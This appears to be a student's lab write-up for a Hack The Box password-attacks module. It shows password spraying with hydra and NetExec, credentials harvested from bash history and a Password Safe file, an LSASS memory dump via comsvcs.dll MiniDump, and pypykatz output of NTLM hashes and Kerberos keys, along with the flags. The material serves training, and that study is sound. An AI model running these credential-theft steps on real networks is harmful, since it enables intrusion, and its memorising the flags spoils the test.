**Network Services


```
 sudo nmap -F 10.129.151.39 
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 08:21 +0530
Nmap scan report for 10.129.151.39
Host is up (0.32s latency).
Not shown: 93 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.24 seconds


```

Q1. Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
use nxc / hydra

```

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         1/5/2022   8:08 AM                3D Objects
d-r---         1/5/2022   8:08 AM                Contacts
d-r---         1/5/2022   8:11 AM                Desktop
d-r---         1/5/2022   8:08 AM                Documents
d-r---         1/5/2022   8:08 AM                Downloads
d-r---         1/5/2022   8:08 AM                Favorites
d-r---         1/5/2022   8:08 AM                Links
d-r---         1/5/2022   8:08 AM                Music
d-r---         1/5/2022   8:08 AM                Pictures
d-r---         1/5/2022   8:08 AM                Saved Games
d-r---         1/5/2022   8:08 AM                Searches
d-r---         1/5/2022   8:08 AM                Videos


*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> type flag.txt
HTB{That5Novemb3r}
*Evil-WinRM* PS C:\Users\john\Desktop> 

```

Q2. Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```
dennis@WINSRV C:\Users\dennis>ls 
'ls' is not recognized as an internal or external command, 
operable program or batch file.                            
                                                           
dennis@WINSRV C:\Users\dennis>dir                          
 Volume in drive C has no label.                   
 Volume Serial Number is 2683-3D37                 
                                                   
 Directory of C:\Users\dennis                      
                                                   
01/05/2022  09:14 AM    <DIR>          .           
01/05/2022  09:14 AM    <DIR>          ..          
01/05/2022  09:14 AM    <DIR>          3D Objects  
01/05/2022  09:14 AM    <DIR>          Contacts    
01/05/2022  09:16 AM    <DIR>          Desktop     
01/05/2022  09:14 AM    <DIR>          Documents   
01/05/2022  09:14 AM    <DIR>          Downloads   
01/05/2022  09:14 AM    <DIR>          Favorites   
01/05/2022  09:14 AM    <DIR>          Links       
01/05/2022  09:14 AM    <DIR>          Music       
01/05/2022  09:14 AM    <DIR>          Pictures    
01/05/2022  09:14 AM    <DIR>          Saved Games 
01/05/2022  09:14 AM    <DIR>          Searches    
01/05/2022  09:14 AM    <DIR>          Videos      
               0 File(s)              0 bytes      
              14 Dir(s)  26,282,475,520 bytes free 

dennis@WINSRV C:\Users\dennis>cd Desktop 

dennis@WINSRV C:\Users\dennis\Desktop>ls 
'ls' is not recognized as an internal or external command, 
operable program or batch file.

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{Let5R0ck1t} 
dennis@WINSRV C:\Users\dennis\Desktop>

```

Q3. Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```
RDP         10.129.151.39   3389   WINSRV           [+] WINSRV\chris:789456123 (Pwn3d!)

```

Q4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```
use msf for brute uin smb cause the nxc output was wrong in this case i dont know why or else disable the tool from stoping after finding valid creds and try that may work

```

**Spraying, Stuffing, and Defaults

Q1. Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: < username >:< password >)

```
https://github.com/ihebski/DefaultCreds-cheat-sheet ///use the cheatsheet and search for mysql pass and try to find the creds in it

```


**Skills Assessment - Password Attacks

## The Credential Theft Shuffle

[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and `gain control over the domain`, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the `Local Administrator Password Solution (LAPS)`, enforcing `multi-factor authentication`, and `restricting administrative privileges` to mitigate such attacks.

## Skills Assessment

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

| Host     | IP Address                                                  |
| -------- | ----------------------------------------------------------- |
| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                              |
| `FILE01` | `172.16.119.10`                                             |
| `DC01`   | `172.16.119.11`                                             |

#### Pivoting Primer

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.

Q1. What is the NTLM hash of NEXURA\Administrator?

```
┌──(satoru㉿satoru)-[~/Desktop/Tools_CPTS/username-anarchy]
└─$ ./username-anarchy Betty Jayde
betty
bettyjayde
betty.jayde
bettyjay
bettjayd
bettyj
b.jayde
bjayde
jbetty
j.betty
jaydeb
jayde
jayde.b
jayde.betty
bj

```

```
hydra -L users.txt -p 'Texas123!@#' ssh://10.129.234.116
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-08 09:15:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-08 09:15:54

```

```
jbetty@DMZ01:~$ cat .bash_history
cd ~/projects
ls
git status
git pull origin main
vim README.md
cat ~/.bashrc
sudo apt update
sudo apt upgrade -y
clear
cd ~/Downloads
ls -lh
rm -rf old_project/
mkdir temp
cd temp
touch test.py
nano test.py
python3 test.py
pip install requests
pip install flask
history
df -h
free -m
top
htop
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
sudo systemctl status apache2
sudo systemctl restart apache2
cd /etc/nginx/sites-available
ls
cat default
sudo nano default
sudo nginx -t
sudo systemctl reload nginx
cd ~
mkdir scripts
cd scripts
vim backup.sh
chmod +x backup.sh
./backup.sh
ssh user@192.168.0.101
scp file.txt user@192.168.0.101:~/Documents/
logout
exit
cd /var/log
ls -ltr
sudo tail -f syslog
sudo journalctl -xe
sudo dmesg | less
ps aux | grep python
kill -9 13245
git clone https://github.com/example/repo.git
cd repo
ls -a
code .
npm install
npm run dev
cd ..
rm -rf repo/
curl https://ipinfo.io
ping google.com
traceroute github.com
whoami
groups
sudo adduser testuser
sudo usermod -aG sudo testuser
su - testuser
exit
passwd
uptime
reboot
mkdir ~/backup
rsync -av ~/Documents/ ~/backup/
du -sh *
alias ll='ls -alF'
unalias ll
history | grep ssh
find . -name "*.log"
grep -r "ERROR" /var/log/
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head
chmod 755 script.sh
chown user:user script.sh
git checkout -b feature/login
git commit -am "Add login feature"
git push origin feature/login
git merge main
git push
git log --oneline
docker ps
docker images
docker run -it ubuntu bash
exit
cd /tmp
touch index.html
echo "<h1>Hello World</h1>" > index.html
cat index.html
python3 -m http.server
curl localhost:8000
ctrl+c
tmux
tmux new -s dev
tmux ls
tmux attach -t dev
tmux kill-session -t dev
man rsync
man chown
crontab -e
lsblk
mount
umount /dev/sdb1
lsusb
lscpu
sudo apt install tree
tree
zip -r archive.zip folder/
unzip archive.zip
wget http://example.com/file.zip
tar -xzvf file.tar.gz
tar -czvf archive.tar.gz folder/
logout

clear
ls -l
clear
ls -l
clear
nano .bash_history
su
clear
ls -l
nano .bash_history
echo > .bash_history
nano .bash_history
less .bash_history 
clear
exit
pwd
cat .bash_history 
exit
jbetty@DMZ01:~$ 

```

```
use the creds login to smb
list the shares 
cd to HR
cd Archive
download the psafe3 file 
use john2psafe
use john with rockyou worldlist and crack the password use it to unlock the psafe3 
 

```
```
 pwsafe Employee-Passwords_OLD.psafe3 &
```
![](Attachments/Pasted%20image%2020260908120134.png)


![](Attachments/Pasted%20image%2020260908120220.png)

![](Attachments/Pasted%20image%2020260908120248.png)

![](Attachments/Pasted%20image%2020260908120311.png)

```

hwilliam:warned-wobble-occur8
stom:fails-nibble-disturb4
bdavid:caramel-cigars-reply1


```

```
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc smb 172.16.119.11 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce
SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.119.11   445    DC01             [-] nexura.htb\hwilliam:warned-wobble-occur8 STATUS_LOGON_FAILURE 
SMB         172.16.119.11   445    DC01             [-] nexura.htb\stom:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc winrm 172.16.119.11 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce
WINRM       172.16.119.11   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) 
WINRM       172.16.119.11   5985   DC01             [-] nexura.htb\hwilliam:warned-wobble-occur8
WINRM       172.16.119.11   5985   DC01             [-] nexura.htb\stom:fails-nibble-disturb4
WINRM       172.16.119.11   5985   DC01             [-] nexura.htb\bdavid:caramel-cigars-reply1
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc winrm 172.16.119.10 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce
WINRM       172.16.119.10   5985   FILE01           [*] Windows 10 / Server 2019 Build 17763 (name:FILE01) (domain:nexura.htb) 
WINRM       172.16.119.10   5985   FILE01           [-] nexura.htb\hwilliam:warned-wobble-occur8
WINRM       172.16.119.10   5985   FILE01           [-] nexura.htb\stom:fails-nibble-disturb4
WINRM       172.16.119.10   5985   FILE01           [-] nexura.htb\bdavid:caramel-cigars-reply1
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc smb 172.16.119.10 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce
SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:True) (SMBv1:None)
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\hwilliam:warned-wobble-occur8 STATUS_LOGON_FAILURE 
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\stom:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\bdavid:caramel-cigars-reply1 
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc rdp 172.16.119.10 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce
RDP         172.16.119.10   3389   FILE01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:FILE01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.10   3389   FILE01           [-] nexura.htb\hwilliam:warned-wobble-occur8 (STATUS_LOGON_FAILURE)
RDP         172.16.119.10   3389   FILE01           [-] nexura.htb\stom:fails-nibble-disturb4 (STATUS_LOGON_FAILURE)
RDP         172.16.119.10   3389   FILE01           [+] nexura.htb\bdavid:caramel-cigars-reply1 
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc rdp 172.16.119.7 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce
RDP         172.16.119.7    3389   JUMP01           [*] Windows 10 or Windows Server 2016 Build 17763 (name:JUMP01) (domain:nexura.htb) (nla:True)
RDP         172.16.119.7    3389   JUMP01           [-] nexura.htb\hwilliam:warned-wobble-occur8 (STATUS_LOGON_FAILURE)
RDP         172.16.119.7    3389   JUMP01           [-] nexura.htb\stom:fails-nibble-disturb4 (STATUS_LOGON_FAILURE)
RDP         172.16.119.7    3389   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)                                                                                        
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc winrm 172.16.119.7 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce
WINRM       172.16.119.7    5985   JUMP01           [*] Windows 10 / Server 2019 Build 17763 (name:JUMP01) (domain:nexura.htb) 
WINRM       172.16.119.7    5985   JUMP01           [-] nexura.htb\hwilliam:warned-wobble-occur8
WINRM       172.16.119.7    5985   JUMP01           [-] nexura.htb\stom:fails-nibble-disturb4
WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)                                                                                        
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc smb 172.16.119.7 -u users.txt -p passwords.txt -d nexura.htb --no-bruteforce


```

```
└─$ evil-winrm -i 172.16.119.7 -u 'bdavid' -p 'caramel-cigars-reply1'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bdavid\Documents> whoami
nexura\bdavid
*Evil-WinRM* PS C:\Users\bdavid\Documents> ls
*Evil-WinRM* PS C:\Users\bdavid\Documents> qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE                      
>services                                    0  Disc
 console                                     1  Conn
 rdp-tcp#0         stom                      2  Active
 rdp-tcp                                 65536  Listen
*Evil-WinRM* PS C:\Users\bdavid\Documents> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 stom                  rdp-tcp#0           2  Active       1:22  9/8/2026 12:21 AM
*Evil-WinRM* PS C:\Users\bdavid\Documents> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1275      33     7280      19956       2.34    636   0 lsass


*Evil-WinRM* PS C:\Users\bdavid\Documents> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump  636 C:\Windows\Temp\lsass.dmp full
*Evil-WinRM* PS C:\Users\bdavid\Documents> ls
*Evil-WinRM* PS C:\Users\bdavid\Documents> dir C:\Windows\Temp\


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/8/2026   1:42 AM          36864 bkehgB
-a----         9/8/2026   1:42 AM       17805312 kjoQBP
-a----         9/8/2026   1:45 AM       49761189 lsass.dmp
-a----         9/8/2026  12:21 AM            102 silconfig.log
------         9/8/2026  12:20 AM         631006 vmware-vmsvc-SYSTEM.log
-a----         9/8/2026  12:21 AM           4316 vmware-vmtoolsd-stom.log
-a----         9/8/2026  12:20 AM           5900 vmware-vmtoolsd-SYSTEM.log
-a----         9/8/2026  12:21 AM           5620 vmware-vmusr-stom.log
-a----         9/8/2026  12:20 AM           5095 vmware-vmvss-SYSTEM.log


```

```
*Evil-WinRM* PS C:\Users\bdavid\Documents> download C:/Windows/Temp/lsass.dmp /home/satoru/Desktop/HTB/CPTS/skills/password_attacks/lsass.dmp
                                        
Info: Downloading C:/Windows/Temp/lsass.dmp to /home/satoru/Desktop/HTB/CPTS/skills/password_attacks/lsass.dmp                                                                                  
Progress: 6% : |▒░░░░░░░░░░|          

```

```
pypykatz lsa minidump ./lsass.dmp 
INFO:pypykatz:Parsing file ./lsass.dmp
FILE: ======== ./lsass.dmp =======
== LogonSession ==
authentication_id 246972 (3c4bc)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-09-08T07:16:25.215710+00:00
sid S-1-5-90-0-2
luid 246972
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [3c4bc]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: JUMP01$
                Domain: nexura.htb
                Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
        == WDIGEST [3c4bc]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 245870 (3c06e)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2026-09-08T07:16:25.189711+00:00
sid S-1-5-96-0-2
luid 245870
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [3c06e]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: JUMP01$
                Domain: nexura.htb
                Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
        == WDIGEST [3c06e]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 69246 (10e7e)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-09-08T07:15:39.750326+00:00
sid S-1-5-90-0-1
luid 69246
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [10e7e]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: JUMP01$
                Domain: nexura.htb
                Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
        == WDIGEST [10e7e]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 69228 (10e6c)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-09-08T07:15:39.750326+00:00
sid S-1-5-90-0-1
luid 69228
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [10e6c]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: JUMP01$
                Domain: nexura.htb
                Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
        == WDIGEST [10e6c]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username JUMP01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:15:39.469072+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [3e4]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: jump01$
                Domain: NEXURA.HTB
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: 9521aa66829ccb2e8263c0fd7ac25e909bba456a1474ecac6676ace5ce7a812b
        == WDIGEST [3e4]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 39627 (9acb)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-09-08T07:15:39.281578+00:00
sid S-1-5-96-0-1
luid 39627
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [9acb]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: JUMP01$
                Domain: nexura.htb
                Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
        == WDIGEST [9acb]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 39611 (9abb)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-09-08T07:15:39.281578+00:00
sid S-1-5-96-0-0
luid 39611
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [9abb]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: JUMP01$
                Domain: nexura.htb
                Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
